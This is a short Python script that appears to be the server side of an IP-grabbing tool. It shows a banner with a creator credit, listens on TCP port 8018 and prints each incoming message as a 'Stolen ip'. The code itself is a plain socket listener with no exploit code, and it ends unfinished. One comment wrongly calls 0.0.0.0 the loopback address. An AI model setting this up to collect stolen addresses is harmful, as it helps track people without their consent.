import socket
import os
import shutil

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white
NC = "\033[0m"
O = "\033[33m"


HOST = '0.0.0.0'  # Standard loopback interface address (localhost)
PORT = 8018        # Port to listen on (non-privileged ports are > 1023)
def banner():
    banner_text = rf'''
{G}
        _____ _           _       
       |  ___| | ___   __| | ___ _ __ 
       | |_  | |/ _ \ / _  |/ _ \  __|
       |  _| | | (_) | (_| |  __/ |   
       |_|   |_|\___/ \__ _|\___|_|   
{NC}
    '''
    print(banner_text)
    print(f'{R}            Created by Thelma-Loise')
    return 0
    
banner() 
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print(f"{O}Server listening on {HOST}:{PORT}")

    conn, addr = s.accept()
    with conn:
        print(f"{G} Connected by {addr}")
        while True:
            data = conn.recv(1024)
            if not data:
                break  # Connection closed by client

            message = data.decode()
            print(f"{G}Stolen ip: {message}")

            # Send response to client


